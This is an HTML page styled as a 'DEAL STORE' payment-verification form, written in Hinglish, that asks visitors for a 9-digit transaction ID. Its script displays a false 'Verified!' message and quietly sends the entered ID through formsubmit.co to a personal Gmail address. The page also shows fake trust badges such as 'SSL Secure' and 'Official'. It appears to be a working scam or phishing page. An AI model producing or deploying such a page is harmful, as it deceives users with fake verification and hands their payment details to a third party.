<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DEAL STORE - Verify</title>
<style>
body{background:#f5f5f5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#fff;border:2px solid #f7b500;border-radius:20px;padding:25px;width:90%;max-width:360px;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.1)}
.uc{width:70px;height:70px;background:linear-gradient(#ffb700,#ff8c00);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:24px;margin:0 auto 15px;border:3px solid #000}
h2{margin:5px 0} p{color:#666;margin:5px 0 15px}
input{width:100%;padding:15px;font-size:22px;text-align:center;letter-spacing:5px;border:2px solid #ddd;border-radius:12px;box-sizing:border-box}
button{width:100%;margin-top:15px;padding:15px;background:#f7b500;border:none;border-radius:12px;font-weight:bold;font-size:18px;cursor:pointer}
.success{display:none;color:green;margin-top:15px;font-weight:bold}
</style>
</head>
<body>
<div class="box">
<div class="uc">UC</div>
<h2>Transaction ID Submit Karein</h2>
<p>DEAL STORE - Payment Verification</p>
<label style="display:block;text-align:left;font-weight:bold;margin-bottom:8px">Transaction ID (9 digits)</label>
<input id="txn" type="number" placeholder="123456789">
<div style="font-size:12px;color:#888;margin-top:5px">Sirf 9 hindse (0-9) likhein</div>
<button onclick="sendMail()">SUBMIT → VERIFY</button>
<div id="ok" class="success">✅ Verified! Hum check kar rahe hain.</div>
<p style="font-size:11px;margin-top:15px">🔒 SSL Secure | White Background Official</p>
</div>
<script>
function sendMail(){
 let id = document.getElementById('txn').value;
 if(id.length != 9){ alert('Please 9 digits likho!'); return; }
 document.getElementById('ok').style.display='block';
 fetch("https://formsubmit.co/ajax/uaepass499@gmail.com", {
   method: "POST",
   headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
   body: JSON.stringify({ "DEAL STORE - Transaction ID": id, "Date": new Date().toString() })
 });
 alert("ID Submitted: " + id);
}
</script>
</body>
</html>
